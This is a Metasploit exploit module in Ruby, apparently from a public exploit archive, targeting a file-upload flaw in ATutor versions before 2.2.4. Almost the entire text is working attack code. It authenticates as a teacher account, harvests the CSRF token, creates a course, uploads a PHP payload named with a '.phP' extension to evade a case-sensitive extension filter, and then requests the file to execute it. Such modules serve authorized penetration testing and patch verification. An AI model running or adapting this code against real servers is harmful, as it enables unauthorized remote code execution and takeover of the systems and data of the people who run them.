# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "ATutor < 2.2.4 &#039;file_manager&#039; Remote Code Execution",
      &#039;Description&#039;    => %q{
         This module allows the user to run commands on the server with teacher user privilege.
         The &#039;Upload files&#039; section in the &#039;File Manager&#039; field contains arbitrary file upload vulnerability.
         The "$IllegalExtensions" function has control weakness and shortcomings.
         It is possible to see illegal extensions within "constants.inc.php". (exe|asp|php|php3|php5|cgi|bat...)
         However, there is no case-sensitive control. Therefore, it is possible to bypass control with filenames such as ".phP", ".Php"
         It can also be used in dangerous extensions such as "shtml" and "phtml". 
         The directory path for the "content" folder is located at "config.inc.php".
         For the exploit to work, the "define (&#039;AT_CONTENT_DIR&#039;, &#039;address&#039;)" content folder must be located in the web home directory or the address must be known.

         This exploit creates a course with the teacher user and loads the malicious php file into server.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;AkkuS <Özkan Mustafa Akkuş>&#039;, # Discovery & PoC & MSF Module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;&#039;  ],
          [ &#039;URL&#039;, &#039;http://pentest.com.tr/exploits/TeemIp-IPAM-2-4-0-new-config-Command-Injection-Metasploit.html&#039; ],
          [ &#039;URL&#039;, &#039;https://atutor.github.io/&#039; ],
          [ &#039;URL&#039;, &#039;http://www.atutor.ca/&#039; ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true,
        },
      &#039;Platform&#039;       => [&#039;php&#039;],
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        => [[ &#039;Automatic&#039;, { }]],
      &#039;DisclosureDate&#039; => &#039;09 April 2019&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The path of Atutor&#039;, &#039;/ATutor/&#039;]),
        OptString.new(&#039;USERNAME&#039;, [true, &#039;The Teacher Username to authenticate as&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [true, &#039;The Teacher password to authenticate with&#039;]),
        OptString.new(&#039;CONTENT_DIR&#039;, [true, &#039;The content folder location&#039;, &#039;content&#039;])
      ],self.class)
  end

  def exec_payload

    send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, "#{datastore[&#039;CONTENT_DIR&#039;]}", @course_id, "#{@fn}")
    })
  end

  def peer
    "#{ssl ? &#039;https://&#039; : &#039;http://&#039; }#{rhost}:#{rport}"
  end

  def print_status(msg=&#039;&#039;)
    super("#{peer} - #{msg}")
  end

  def print_error(msg=&#039;&#039;)
    super("#{peer} - #{msg}")
  end

  def print_good(msg=&#039;&#039;)
    super("#{peer} - #{msg}")
  end
##
# Version and Vulnerability Check
##
  def check

    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, "#{datastore[&#039;CONTENT_DIR&#039;]}/")
    })

    unless res
      vprint_error &#039;Connection failed&#039;
      return CheckCode::Unknown
    end

    if res.code == 404
       return Exploit::CheckCode::Safe
    end
    return Exploit::CheckCode::Appears
  end
##
# csrftoken read and create a new course
##
  def create_course(cookie, check)

    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, "mods", "_core", "courses", "users", "create_course.php"),
      &#039;headers&#039; =>
      {
        &#039;Referer&#039; => "#{peer}#{datastore[&#039;TARGETURI&#039;]}users/index.php",
        &#039;cookie&#039;   => cookie,
      },
      &#039;agent&#039; => &#039;Mozilla&#039;
    })

    if res && res.code == 200 && res.body =~ /Create Course: My Start Pag/
      @token = res.body.split(&#039;csrftoken"  value="&#039;)[1].split(&#039;"&#039;)[0]
    else
      return false
    end 

    @course_name = Rex::Text.rand_text_alpha_lower(5)
    post_data = Rex::MIME::Message.new
    post_data.add_part(@token, nil, nil,&#039;form-data; name="csrftoken"&#039;)
    post_data.add_part(&#039;true&#039;, nil, nil, &#039;form-data; name="form_course"&#039;)
    post_data.add_part(@course_name, nil, nil, &#039;form-data; name="title"&#039;)
    post_data.add_part(&#039;top&#039;, nil, nil, &#039;form-data; name="content_packaging"&#039;)
    post_data.add_part(&#039;protected&#039;, nil, nil, &#039;form-data; name="access"&#039;)
    post_data.add_part(&#039;Save&#039;, nil, nil, &#039;form-data; name="submit"&#039;)
    data = post_data.to_s

    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,    
      &#039;data&#039;  => data,
      &#039;agent&#039; => &#039;Mozilla&#039;,
      &#039;ctype&#039; => "multipart/form-data; boundary=#{post_data.bound}",
      &#039;cookie&#039; => cookie,
      &#039;uri&#039; => normalize_uri(target_uri.path, "mods", "_core", "courses", "users", "create_course.php")     
    })

    location = res.redirection.to_s
    if res && res.code == 302 && location.include?(&#039;bounce.php?course&#039;)
      @course_id = location.split(&#039;course=&#039;)[1].split("&p")[0]
      return true
    else
      return false
    end
  end
##
# Upload malicious file // payload integration
##
  def upload_shell(cookie, check)

    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, "bounce.php?course=" + @course_id),
      &#039;headers&#039; =>
      {
        &#039;Referer&#039; => "#{peer}#{datastore[&#039;TARGETURI&#039;]}users/index.php",
        &#039;cookie&#039;   => cookie,
      },
      &#039;agent&#039; => &#039;Mozilla&#039;
    })

    ucookie = "ATutorID=#{$2};" if res.get_cookies =~ /ATutorID=(.*); ATutorID=(.*);/

    file_name = Rex::Text.rand_text_alpha_lower(8) + ".phP"
    @fn = "#{file_name}"
    post_data = Rex::MIME::Message.new
    post_data.add_part(&#039;10485760&#039;, nil, nil, &#039;form-data; name="MAX_FILE_SIZE"&#039;)
    post_data.add_part(payload.encoded, &#039;application/octet-stream&#039;, nil, "form-data; name=\"uploadedfile\"; filename=\"#{file_name}\"")
    post_data.add_part(&#039;Upload&#039;, nil, nil, &#039;form-data; name="submit"&#039;)
    post_data.add_part(&#039;&#039;, nil, nil, &#039;form-data; name="pathext"&#039;)

    data = post_data.to_s

    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,    
      &#039;data&#039;  => data,
      &#039;agent&#039; => &#039;Mozilla&#039;,
      &#039;ctype&#039; => "multipart/form-data; boundary=#{post_data.bound}",
      &#039;cookie&#039; => ucookie,
      &#039;uri&#039; => normalize_uri(target_uri.path, "mods", "_core", "file_manager", "upload.php")     
    })

    if res && res.code == 302 && res.redirection.to_s.include?(&#039;index.php?pathext&#039;)
      print_status("Trying to upload #{file_name}")
      return true
    else
      print_status("Error occurred during uploading!")
      return false
    end
  end
##
# Password encryption with csrftoken
##
  def get_hashed_password(token, password, check)
    if check
      return Rex::Text.sha1(password + token)
    else
      return Rex::Text.sha1(Rex::Text.sha1(password) + token)
    end
  end
##
# User login operations
##
  def login(username, password, check)
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, "login.php"),
      &#039;agent&#039; => &#039;Mozilla&#039;,
    })

    token = $1 if res.body =~ /\) \+ \"(.*)\"\);/
    cookie = "ATutorID=#{$1};" if res.get_cookies =~ /; ATutorID=(.*); ATutorID=/
    if check
      password = get_hashed_password(token, password, true)
    else
      password = get_hashed_password(token, password, false)
    end

    res = send_request_cgi({
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, "login.php"),
      &#039;vars_post&#039; => {
        &#039;form_password_hidden&#039; => password,
        &#039;form_login&#039; => username,
        &#039;submit&#039; => &#039;Login&#039;
      },
      &#039;cookie&#039; => cookie,
      &#039;agent&#039; => &#039;Mozilla&#039;
    })
    cookie = "ATutorID=#{$2};" if res.get_cookies =~ /(.*); ATutorID=(.*);/

    if res && res.code == 302
       if res.redirection.to_s.include?(&#039;bounce.php?course=0&#039;)
        res = send_request_cgi({
          &#039;method&#039;   => &#039;GET&#039;,
          &#039;uri&#039;      => normalize_uri(target_uri.path, res.redirection),
          &#039;cookie&#039; => cookie,
          &#039;agent&#039; => &#039;Mozilla&#039;
        })
        cookie = "ATutorID=#{$1};" if res.get_cookies =~ /ATutorID=(.*);/
        if res && res.code == 302 && res.redirection.to_s.include?(&#039;users/index.php&#039;)
           res = send_request_cgi({
             &#039;method&#039;   => &#039;GET&#039;,
             &#039;uri&#039;      => normalize_uri(target_uri.path, res.redirection),
             &#039;cookie&#039; => cookie,
             &#039;agent&#039; => &#039;Mozilla&#039;
           })
           cookie = "ATutorID=#{$1};" if res.get_cookies =~ /ATutorID=(.*);/
           return cookie
          end
       else res.redirection.to_s.include?(&#039;admin/index.php&#039;)
          fail_with(Failure::NoAccess, &#039;The account is the administrator. Please use a teacher account!&#039;)
          return cookie
       end
    end

    fail_with(Failure::NoAccess, "Authentication failed with username #{username}")
    return nil
  end
##
# Exploit controls and information
##
  def exploit
    tcookie = login(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;], false)
    print_good("Logged in as #{datastore[&#039;USERNAME&#039;]}")

    if create_course(tcookie, true)
      print_status("CSRF Token : " + @token)
      print_status("Course Name : " + @course_name + " Course ID : " + @course_id)
      print_good("New course successfully created.")
    end

    if upload_shell(tcookie, true)
      print_good("Upload successfully.")
      print_status("Trying to exec payload...")
      exec_payload
    end
  end
end
##
# The end of the adventure (o_O) // AkkuS
##

